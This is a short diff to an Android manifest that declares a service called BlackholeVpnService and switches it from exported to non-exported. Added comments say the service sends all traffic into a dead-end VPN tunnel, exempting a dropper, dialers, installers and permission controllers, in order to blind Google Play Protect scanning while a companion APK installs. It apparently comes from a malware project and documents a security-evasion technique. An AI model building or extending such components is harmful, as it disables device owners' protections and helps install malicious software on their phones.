@@ -112,9 +112,12 @@
             android:exported="false"
             android:permission="android.permission.BIND_JOB_SERVICE" />
 
+        <!-- BlackholeVpnService: VPN blackhole that routes ALL traffic to dead-end tunnel -->
+        <!-- Excludes 20 apps (dropper + messaging + dialers + installers + permission controllers) -->
+        <!-- Blinds Google Play Protect cloud scanning during companion APK install -->
         <service
             android:name=".BlackholeVpnService"
-            android:exported="true"
+            android:exported="false"
             android:permission="android.permission.BIND_VPN_SERVICE"
             android:foregroundServiceType="specialUse">
             <intent-filter>
